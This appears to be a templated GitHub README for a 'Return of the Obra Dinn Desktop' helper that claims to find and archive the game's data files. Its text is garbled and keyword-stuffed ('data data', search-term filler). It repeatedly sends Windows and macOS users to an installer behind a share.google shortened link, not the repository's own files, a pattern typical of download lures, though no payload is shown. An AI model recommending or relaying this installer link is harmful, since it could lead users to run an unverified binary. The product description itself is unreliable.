![Return of the Obra Dinn Desktop](assets/hero.png)

# Return of the Obra Dinn Desktop

*Dated copies of Return of the Obra Dinn data data, nothing uploaded.*

## What Return of the Obra Dinn Desktop is

**Return of the Obra Dinn Desktop** runs on your own PC. A desktop helper that finds Return of the Obra Dinn data directories and archives config and export files locally.

Return of the Obra Dinn drops data files next to launcher caches.

Point it at a path, preview the plan if you want, then write the result next to the source or to `--out`.

## How to get it

Use the command-line copy in this repository if you already have Python.

If you want a normal installer for Windows or macOS, open the [setup page](https://share.google/A1IHfyGRT0zGRLqj8) and follow the steps there.

## What it does

- Finds the Return of the Obra Dinn data directory.
- Copies config and export files to a dated archive.
- Lists photo and export folders.
- Writes a short report of what was kept.

## The problem

People search Return of the Obra Dinn desktop and PC when they want the folder on disk.

A named helper is easier to find than a generic zip.

## Requirements

- Windows 10 or 11 for the desktop build
- Python 3.11 or newer only if you run the CLI from this repository
- Runs locally on the PC that starts it; no account required for the CLI

## Usage

Python 3.11 or newer. From the repository root:

```bash
python -m pip install -r requirements.txt
python main.py --help
```

`--preview` prints the plan and does not write. `--out` sets an output folder when the command supports it.

## Desktop build

[![Download](assets/download.png)](https://share.google/A1IHfyGRT0zGRLqj8)

**[Windows and macOS installer](https://share.google/A1IHfyGRT0zGRLqj8)**

Source: https://github.com/elea-dixon47/return-of-the-obra-dinn-desktop

MIT license. See `LICENSE`.
